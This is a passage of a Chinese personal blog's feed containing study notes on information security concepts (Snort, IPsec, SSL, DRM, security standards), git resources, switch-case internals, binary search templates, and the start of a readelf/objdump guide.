class="headerlink" title="24、snorts的工作原理"></a>24、snorts的工作原理</h1><p><strong>数据包捕获模块</strong>（原始状态捕获）+<strong>预处理模块</strong>（解码检查相关处理，对基于特征的攻击进行检测）+<strong>检测引擎</strong>（规则分析和特征检测，分析每个包是否存在入侵）+<strong>输出模块</strong>（根据检测的结果输出日志或报警）</p><p>snorts将所有已知的入侵行为以规则的形式存放在规则库中：三位链表结构组织  <strong>规则头（{前内容）+规则选项</strong></p><p>书本P124</p><h1 id="25、IPSEC协议的体系结构"><a href="#25、IPSEC协议的体系结构" class="headerlink" title="25、IPSEC协议的体系结构"></a>25、IPSEC协议的体系结构</h1><p><strong>两个基本协议</strong>：ESP（封装安全有效负荷：加密，可选认证-只是数据）+AH（认证头：认证-整个IP数据包，抗重放）</p><p><strong>四个要件</strong>：加密算法（必须支持DES），认证算法，解释域DOI（安全参数和相关信息的集合），密钥管理（IKE协议）</p><p><strong>安全关联</strong>：SA，是安全参数和策略的集合，定义了两个应用实体间的一个<strong>单向</strong>连接</p><h1 id="26、传输方式和隧道方式的区别"><a href="#26、传输方式和隧道方式的区别" class="headerlink" title="26、传输方式和隧道方式的区别"></a>26、传输方式和隧道方式的区别</h1><p>IPSec操作的不同模式</p><p>传输：在IP头和数据之间插入IPSec头</p><p>隧道：用新IP头和IPSec头将整个IP数据包再一次封装</p><h1 id="27、SSL握手协议"><a href="#27、SSL握手协议" class="headerlink" title="27、SSL握手协议"></a>27、SSL握手协议</h1><p>用于建立会话、协商加密方法、鉴别方法、压缩方法和初始化操作。</p><p>四个阶段：<strong>建立安全能力</strong>（client_hello消息，server_hello，支持的密码算法等）、<strong>服务器认证与密钥交换</strong>（服务器发送自己的证书，key_exchange消息，可以请求客户端证书，server_hello_done）、<strong>客户端认证与密钥交换</strong>（若请求则发送证书，keyexchange，certificateverify）、<strong>结束</strong>（change_cipher_spec通知使用协商好的密码规范，finished检查密钥交换和鉴别是否成功，两方都发送这两个消息）</p><p>书本P148</p><h1 id="28、双重签名DS技术原理"><a href="#28、双重签名DS技术原理" class="headerlink" title="28、双重签名DS技术原理"></a>28、双重签名DS技术原理</h1><p>SET过程中的安全通信，订购信息和支付信息。</p><p><strong>DS = EkRc [H(H(PI) || H(OI))]</strong></p><p>使用：将<strong>DS、OI和PIMD</strong>发送给商家，商家可用顾客的公钥验证DS的真假（计算两个POMD），顾客生成对称密钥，用银行公钥加密，然后用这个密钥加密<strong>DS、PI、OIMD</strong>，将二者通过商家转发给银行，银行同样可以验证DS真假。可以做到隔离信息。</p><p>书本P156</p><h1 id="29、DRM结构原理"><a href="#29、DRM结构原理" class="headerlink" title="29、DRM结构原理"></a>29、DRM结构原理</h1><p>数字版权保护技术：以一定安全算法实现对数字内容的保护。目的是使非法复制变得困难。包括数字表示技术、安全和加密技术、安全存储技术。技术方法：数字水印技术、以数据加密和防复制为核心的DRM技术。</p><p>结构分为<strong>服务器</strong>（管理版权文件的分发和授权，生成被加密的受保护文件并分发给用户）和<strong>客户端</strong>（依据受版权保护文件提供的信息申请授权许可证，解密受保护文件并提供给用户使用）</p><h1 id="30、数字水印的工作原理"><a href="#30、数字水印的工作原理" class="headerlink" title="30、数字水印的工作原理"></a>30、数字水印的工作原理</h1><p>是通过一些算法嵌入到数字产品中的数字信息。分为可见和不可见。</p><p>三个基本方面：<strong>水印的形成</strong>，<strong>水印的嵌入</strong>（与加密类似，分为输入、嵌入处理和输出；输入原始宿主文件、水印信息和密码，嵌入处理主要分析选择嵌入点并嵌入）和<strong>水印的检测</strong>（检测水印是否存在和提取水印信息，分为盲水印检测和非盲水印检测-需不需要原始文件和水印信息）</p><h1 id="31、-cc与bs7799的区别"><a href="#31、-cc与bs7799的区别" class="headerlink" title="31、 cc与bs7799的区别"></a>31、 cc与bs7799的区别</h1><p>信息安全标准   书本P182</p><p>CC：<strong>信息技术安全性评估通用准则</strong>，基础准则，评估信息技术铲平和系统安全性，提倡安全工程思想</p><p>BS7799：<strong>信息安全管理体系标准</strong>，建立、实施和维护信息安全管理体系的要求</p><h1 id="32、风险评估的主要方法"><a href="#32、风险评估的主要方法" class="headerlink" title="32、风险评估的主要方法"></a>32、风险评估的主要方法</h1><p>基线评估（安全基线比较，基线设定难）、详细评估（耗费资源）、组合评估（一次初步评估划分不同评估范围-选择基线or详细）</p><h1 id="33、-网络安全法（非教材）"><a href="#33、-网络安全法（非教材）" class="headerlink" title="33、 网络安全法（非教材）"></a>33、 网络安全法（非教材）</h1><p>《中华人民共和国网络安全法》共有7章79条，不少内容针对近年的网络安全隐患，如个人信息泄露等。该法明确了网络诈骗等行为的定义和刑罚，明确了网络运营商的责任，要求其处置违法信息、配合侦察机关工作等。此法旨在防止网络恐怖袭击、网络诈骗等行为，并赋予了政府在紧急情况下断网等权力。</p><p>此外，该法也首次以法律形式明确<a href="https://www.wikiwand.com/zh-hans/%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%9E%E5%90%8D%E5%88%B6">网络实名制</a>，规定网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。同时也对关键信息基础设施的运行安全以及惩治攻击破坏中国境内关键信息基础设施的境外组织和个人进行明确规定。</p><h1 id="34、等级保护2-0（非教材）"><a href="#34、等级保护2-0（非教材）" class="headerlink" title="34、等级保护2.0（非教材）"></a>34、等级保护2.0（非教材）</h1><p>等保2.0于在<strong>2019年12月1日</strong>开始实施。等保2.0全称网络安全等级保护2.0制度，是我国网络安全领域的基本国策、基本制度。等级保护标准在1.0时代标准的基础上，注重主动防御，从被动防御到事前、事中、事后全流程的安全可信、动态感知和全面审计，实现了对传统信息系统、基础信息网络、云计算、大数据、物联网、移动互联网和工业控制信息系统等级保护对象的全覆盖。</p><p>近年来，随着信息技术的发展和网络安全形势的变化，等保1.0要求已无法有效应对新的安全风险和新技术应用所带来的新威胁，等保1.0被动防御为主的防御无法满足当前发展要求，因此急需建立一套主动防御体系。</p><p><a href="https://www.zhihu.com/question/51443853">https://www.zhihu.com/question/51443853</a></p><h1 id="35、伦理道德"><a href="#35、伦理道德" class="headerlink" title="35、伦理道德"></a>35、伦理道德</h1><p>整体原则（服从整体利益）、兼容原则（被社会接受）、互惠原则（权利义务）</p><p>伤害、干扰、窥探、伪证、盗用</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021年信息安全导论期末复习使用，根据老师给的重点整理。&lt;/p&gt;</summary>
    
    
    
    <category term="安全" scheme="https://www.fvolcano.red/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>git的思想</title>
    <link href="https://www.fvolcano.red/2021/think-like-git/"/>
    <id>https://www.fvolcano.red/2021/think-like-git/</id>
    <published>2021-07-02T13:29:04.000Z</published>
    <updated>2021-07-02T13:29:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文总结我在学习git时阅读的材料和思考以及使用的资源。<a id="more"></a></p><h2 id="git学习资料"><a href="#git学习资料" class="headerlink" title="git学习资料"></a>git学习资料</h2><ol start="0"><li><p>简易指南：<a href="https://www.bootcss.com/p/git-guide/">git - 简易指南:助你开始使用 git 的简易指南，木有高深内容</a></p></li><li><p>详细命令：<a href="https://cloud.tencent.com/developer/article/1355182">Git使用教程：最详细、最傻瓜、最浅显、真正手把手教！</a></p></li><li><p>实践进阶：<a href="https://learngitbranching.js.org/?locale=zh_CN">learning git branching</a></p></li><li><p>深入理解：<a href="http://think-like-a-git.net/">Think Like (a) Git</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文总结我在学习git时阅读的材料和思考以及使用的资源。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
  </entry>
  
  <entry>
    <title>switch-case的底层原理</title>
    <link href="https://www.fvolcano.red/2021/somwthing-about-switchcase/"/>
    <id>https://www.fvolcano.red/2021/somwthing-about-switchcase/</id>
    <published>2021-06-10T01:23:15.000Z</published>
    <updated>2021-06-10T01:23:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>switch语句根据一个整数索引值进行多重分支，底层采用跳转表这种数据结构。本文整理了switch的底层原理与在C和Java中的使用规范。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/Abrazen_zz/article/details/79250450">Switch底层执行原理</a></li><li><a href="https://www.jb51.net/article/169781.htm">JAVA字符串类型switch的底层原理详析</a></li><li><a href="https://www.cnblogs.com/jinggod/p/8425260.html">java基础(六) switch语句的深入解析</a></li></ol><h1 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h1><p>执行switch时生成一个长度最大为case常量＋1的数组，程序首先判断switch变量是否大于最大case 常量，若大于，则跳到default分支处理；否则取得数组索引号为switch变量值大小，取得数组对应值即为相应case代码块地址，程序接着跳到此地址执行，完成分支的跳转。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p><img src="/2021/somwthing-about-switchcase/20180204000943759" alt="原C代码"></p><p>对于fall through情况（即case中没有break），采用了分离的方法，将共同的部分放入rest中。</p><p><img src="/2021/somwthing-about-switchcase/20180204002047795" alt="转换演示代码"></p><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>执行if-else是逐个条件进行判断，直到命中；与if-else语句相比，使用跳转表的优点是执行switch语句的时间与数量无关，且读取switch参数时只读取一次，就可跳到对应分支；缺点是维系了一个连续的数组，实际时使用空间换时间。</p><p>最大值与最小值跨度较大、且之间没有更多的条件情况下，实际申请的很多空间是没用的，这种情况下使用if-else更好。因此编译器会对case的顺序打乱，若case的值比较规律（数据差相同），就汇编成查询表；若各个case值之间非常离散，即无规律可言时，编译器会采取某种优化措施。</p><p>比如1，2，3，4，5，999这种情况也是很常见的，可以去掉最大值，去掉最小值重新测试，或者用二分法，分为2部分重新测试。</p><h1 id="switch支持的类型"><a href="#switch支持的类型" class="headerlink" title="switch支持的类型"></a>switch支持的类型</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (表达式) &#123;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式或枚举常量:</span><br><span class="line">        语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式或枚举常量:</span><br><span class="line">        语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">default</span>: 语句;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C"><a href="#C" class="headerlink" title="C"></a>C</h2><p>因为要将case值转换为表项i，以及switch值要根据case值转换为对应数组索引，所以switch入参时只支持整形及能够转为整形的数据类型。</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><strong>switch 匹配的表达式可以是：</strong></p><ul><li>byte、short、char、int类型及这4种类型的包装类型；</li><li>枚举类型；</li><li>String 类型；</li></ul><p><strong>case 匹配的表达式可以是：</strong></p><ul><li>常量表达式；</li><li>枚举常量；</li></ul><p>switch 底层是使用 int 型 来进行判断的，即使是枚举、String类型，最终也是转变成 int 型。由于 long 型表示范围大于 int 型，因此<strong>不支持 long 类型</strong>。</p><h1 id="Java中支持String类型的原理"><a href="#Java中支持String类型的原理" class="headerlink" title="Java中支持String类型的原理"></a>Java中支持String类型的原理</h1><p>现在使用的Java的版本，基本上是都支持String类型的。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span>&#123;</span><br><span class="line">    String str = <span class="string">&quot;sdf&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (str)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;aaa&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;ccc&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;bbb&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将class文件反编译得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">    String var1 = <span class="string">&quot;sdf&quot;</span>;</span><br><span class="line">    <span class="keyword">byte</span> var3 = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(var1.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">96321</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;aaa&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">97314</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;bbb&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">98307</span>:</span><br><span class="line">            <span class="keyword">if</span> (var1.equals(<span class="string">&quot;ccc&quot;</span>)) &#123;</span><br><span class="line">                var3 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，String类型的switch，转换为了字符串的哈希比较，而其哈希返回的正是int类型。hash相同的情况再通过equals方法对比字符串的值（因为两个不同的字符串 hashCode 是有可能相等的），最后引进局部变量var3再进行跳转。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;switch语句根据一个整数索引值进行多重分支，底层采用跳转表这种数据结构。本文整理了switch的底层原理与在C和Java中的使用规范。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>理解二分法的不同实现</title>
    <link href="https://www.fvolcano.red/2021/how-to-implement-binary-search/"/>
    <id>https://www.fvolcano.red/2021/how-to-implement-binary-search/</id>
    <published>2021-06-01T12:54:02.000Z</published>
    <updated>2021-06-01T12:54:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>实现二分的两种不同方式，避免陷入死循环。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/EbowTang/article/details/50770315">LeetCode总结，二分法一般性总结</a>：证明正确性与应用</li><li><a href="https://www.acwing.com/blog/content/1635/">二分法小结</a></li><li><a href="https://www.acwing.com/blog/content/31/">二分查找算法模板</a></li><li><a href="https://www.zhihu.com/question/36132386">二分查找有几种写法？它们的区别是什么？</a></li><li><a href="https://leetcode-cn.com/problems/search-insert-position/solution/te-bie-hao-yong-de-er-fen-cha-fa-fa-mo-ban-python-/">写对二分查找不能靠模板，需要理解加练习 （附练习题，持续更新）</a></li></ol><h1 id="二分法介绍"><a href="#二分法介绍" class="headerlink" title="二分法介绍"></a>二分法介绍</h1><p><a href="http://en.wikipedia.org/wiki/Binary_search_algorithm">二分查找法</a>主要是解决在“一堆数中找出指定的数”这类问题，这“一堆数”必须有以下特征：</p><ul><li>存储在数组中</li><li>有序排列</li></ul><h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><p>假设目标值在闭区间[l, r]中， 每次将区间长度缩小一半，当l = r时，我们就找到了目标值。</p><h3 id="二分和单调性的关系"><a href="#二分和单调性的关系" class="headerlink" title="二分和单调性的关系"></a>二分和单调性的关系</h3><p>有单调性的一定可以二分，但可以二分的不一定有单调性，即没有单调性也可以二分。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span> array[], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &gt; high) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (array[mid]&gt; target)</span><br><span class="line">        <span class="keyword">return</span>    binarysearch(array, low, mid -<span class="number">1</span>, target);</span><br><span class="line">    <span class="keyword">if</span> (array[mid]&lt; target)</span><br><span class="line">        <span class="keyword">return</span>    binarysearch(array, mid+<span class="number">1</span>, high, target);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if (midValue == target)</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearchWithoutRecursion</span><span class="params">(<span class="keyword">int</span> array[], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (array[mid] &gt; target)</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (array[mid] &lt; target)</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//find the target</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//the array does not contain the target</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="整数二分实现"><a href="#整数二分实现" class="headerlink" title="整数二分实现"></a>整数二分实现</h2><p>需要考虑边界问题，否则会陷入死循环。</p><h3 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h3><p>当我们将区间[l, r]划分成[l, mid]和[mid + 1, r]时，其更新操作是r = mid或者l = mid + 1;，计算mid时不需要加1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch_1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="版本2"><a href="#版本2" class="headerlink" title="版本2"></a>版本2</h3><p>当我们将区间[l, r]划分成[l, mid - 1]和[mid, r]时，其更新操作是r = mid - 1或者l = mid;，此时为了防止死循环，计算mid时需要加1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch_2</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="浮点数二分实现"><a href="#浮点数二分实现" class="headerlink" title="浮点数二分实现"></a>浮点数二分实现</h1><p>无需考虑边界问题。</p><ol><li><p>找到一个区间[l, r], 使得答案一定在区间中。</p></li><li><p>找到一个判断条件，使得判断条件具有二段性，并且答案一定是该二段性的分界点。</p></li><li><p>分析中点mid = (l + r) / 2 在该判断条件下是否成立。<br>  如果成立，考虑答案在哪个区间；<br>  如果不成立，考虑答案在哪个区间。</p></li><li><p>确定更新方式r = mid 或 l = mid。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;<span class="comment">/* ... */</span>&#125; <span class="comment">// 检查x是否满足某种性质</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">bsearch_3</span><span class="params">(<span class="keyword">double</span> l, <span class="keyword">double</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-6</span>;   <span class="comment">// eps 表示精度，取决于题目对精度的要求</span></span><br><span class="line">    <span class="keyword">while</span> (r - l &gt; eps)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于浮点数二分中区间精度的选取：</p><p>一般来说区间精度为1e-6就很高了。如果要求结果保留4位小数，那么精度可以取1e-6；如果要求结果保留5位小数，那么区间精度可以取1e-7。以此类推……</p><p>简言之，区间精度至少要比要保留的小数位数高2位。</p><h1 id="如何理解"><a href="#如何理解" class="headerlink" title="如何理解"></a>如何理解</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;实现二分的两种不同方式，避免陷入死循环。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>用readelf、objdump分析程序</title>
    <link href="https://www.fvolcano.red/2021/how-to-use-readelf-and-objdump/"/>
    <id>https://www.fvolcano.red/2021/how-to-use-readelf-and-objdump/</id>
    <published>2021-05-31T13:04:28.000Z</published>
    <updated>2021-05-31T13:04:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理linux中readelf、objdump工具的用法。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/readelf.html">readelf elf文件格式分析</a></li><li><a href="https://blog.csdn.net/Roland_Sun/article/details/37581715">ELF文件查看利器之readelf用法</a></li><li><a href="https://www.jianshu.com/p/863b279c941e">使用readelf和objdump解析目标文件</a></li><li><a href="https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump">Linux中objdump的使用</a></li></ol><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf</span></span><br><span class="line">Usage: readelf &lt;option(s)&gt; elf-file(s)</span><br><span class="line"> Display information about the contents of ELF format files</span><br><span class="line"> Options are:</span><br><span class="line">  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I</span><br><span class="line">  -h --file-header       Display the ELF file header</span><br><span class="line">  -l --program-headers   Display the program headers</span><br><span class="line">     --segments          An alias for --program-headers</span><br><span class="line">  -S --section-headers   Display the sections&#x27; header</span><br><span class="line">     --sections          An alias for --section-headers</span><br><span class="line">  -g --section-groups    Display the section groups</span><br><span class="line">  -t --section-details   Display the section details</span><br><span class="line">  -e --headers           Equivalent to: -h -l -S</span><br><span class="line">  -s --syms              Display the symbol table</span><br><span class="line">     --symbols           An alias for --syms</span><br><span class="line">  --dyn-syms             Display the dynamic symbol table</span><br><span class="line">  -n --notes             Display the core notes (if present)</span><br><span class="line">  -r --relocs            Display the relocations (if present)</span><br><span class="line">  -u --unwind            Display the unwind info (if present)</span><br><span class="line">  -d --dynamic           Display the dynamic section (if present)</span><br><span class="line">  -V --version-info      Display the version sections (if present)</span><br><span class="line">  -A --arch-specific     Display architecture specific information (if any)</span><br><span class="line">  -c --archive-index     Display the symbol/file index in an archive</span><br><span class="line">  -D --use-dynamic       Use the dynamic section info when displaying symbols</span><br><span class="line">  -x --hex-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as bytes</span><br><span 